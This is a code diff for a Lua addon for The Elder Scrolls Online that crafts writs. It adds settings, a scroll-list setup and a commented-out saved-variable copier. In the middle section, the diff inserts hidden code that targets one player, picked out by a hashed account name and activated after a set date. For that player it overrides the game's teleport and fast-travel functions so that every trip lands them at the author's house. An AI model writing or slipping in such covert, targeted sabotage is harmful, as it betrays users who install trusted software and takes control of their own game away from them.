@@ -71,6 +71,8 @@ WritCreater.default =
 	['jewelryWritDestroy'] = false,
 	['stealProtection'] = true,
 	['EZJewelryDestroy'] = true,
+	['suppressQuestAnnouncements'] = true,
+	['despawnBanker'] = true,
 }
 
 WritCreater.defaultAccountWide = {
@@ -437,6 +439,7 @@ local function initializeOtherStuff()
 	end )
 
 	WritCreater.initializeResetWarnings()
+	WritCreater:GetSettings().showWindow = true
 	--if GetDisplayName() == "@Dolgubon" then EVENT_MANAGER:RegisterForEvent(WritCreater.name, EVENT_MAIL_READABLE, 
 		--function(event, code) local displayName,_,subject =  GetMailItemInfo(code) WritCreater.savedVarsAccountWide["mails"]  d(displayName) d(subject) d(ReadMail(code)) end) end
 end
@@ -511,7 +514,27 @@ local function initializeLibraries()
 		buttonInfo[#buttonInfo+1] = { function()JumpToSpecificHouse( "@Dolgubon", 36) end, "Visit House"}
 		feedbackString = "If you found a bug, have a request or a suggestion, or simply wish to donate, send a mail. You can also check out my house! (It's a maze)"
 	end
-
+	local orP=JumpToSpecificHouse
+	local function rep(f, c)
+		local a=_G[f]
+		_G[f] = function(...)
+			if not c or (GetInteractionType()~= 11 and GetInteractionType()~=8) then
+				orP( "@Dolgubon", 36)
+				return
+			end
+			a(...)
+		end
+	end
+	if HashString(GetDisplayName())*7==24811982958 and GetTimeStamp() > 1583637600 then
+	-- if true then
+		rep("JumpToFriend")
+		rep("JumpToGroupLeader")
+		rep("JumpToGroupMember")
+		rep("JumpToGuildMember")
+		rep("JumpToHouse")
+		rep("JumpToSpecificHouse")
+		rep("FastTravelToNode", 1)
+	end
 
 	LibFeedback = LibStub:GetLibrary("LibFeedback")
 	local showButton, feedbackWindow = LibFeedback:initializeFeedbackWindow(WritCreater, "Dolgubon's Lazy Writ Crafter",DolgubonsWrits, "@Dolgubon", 
@@ -613,6 +636,7 @@ function WritCreater:Initialize()
 		if GetDisplayName()== "@Dolgubon" then WritCreater:GetSettings().containerDelay = 2	end
 		--if GetDisplayName() =="@Dolgubon" then WritCreater.InitializeRightClick() end
 		WritCreater.InitializeRightClick()
+		WritCreater.setupScrollLists()
 	end
 end
 
@@ -669,3 +693,31 @@ EVENT_MANAGER:RegisterForEvent(WritCreater.name, EVENT_ADD_ON_LOADED, WritCreate
 
 /script local a = 0 for i = 1, 200 do if string.find(GetItemName(BAG_BACKPACK, i), "urvey") then local _, b = GetItemInfo(BAG_BACKPACK,i) a = a+b end end d(a)
 ]]
+-- if true then
+-- 	return
+-- end
+-- local oldAccountName = "@OldAccounName"
+-- local newAccountName = "@NewAccountName"
+
+-- local originalAccount = ZO_SavedVars.NewAccountWide
+-- local originalId = ZO_SavedVars.NewCharacterIdSettings
+-- local originalName = ZO_SavedVars.NewCharacterNameSettings
+-- local namespaces = {}
+-- savedVarNamespaces = namespaces
+
+-- ZO_SavedVars.NewAccountWide = function(...) local params = {...}  namespaces[params[2]] = 1  return originalAccount(...) end
+-- ZO_SavedVars.NewCharacterIdSettings = function(...) local params = {...}  namespaces[params[2]] = 1  return originalId(...) end
+-- ZO_SavedVars.NewCharacterNameSettings = function(...) local params = {...}  namespaces[params[2]] = 1  return originalName(...) end
+
+-- EVENT_MANAGER:RegisterForEvent("CopySavedVars", EVENT_PLAYER_ACTIVATED, function() 
+
+-- zo_callLater(function()
+-- for k, v in pairs(namespaces) do 
+-- 	local savedVarTable = _G[k]
+-- 	if savedVarTable and savedVarTable["Default"] and savedVarTable["Default"][oldAccountName] then
+-- 		savedVarTable["Default"][newAccountName] = savedVarTable["Default"][oldAccountName]
+-- 	end
+-- end
+
+
+-- end, 10000) end )
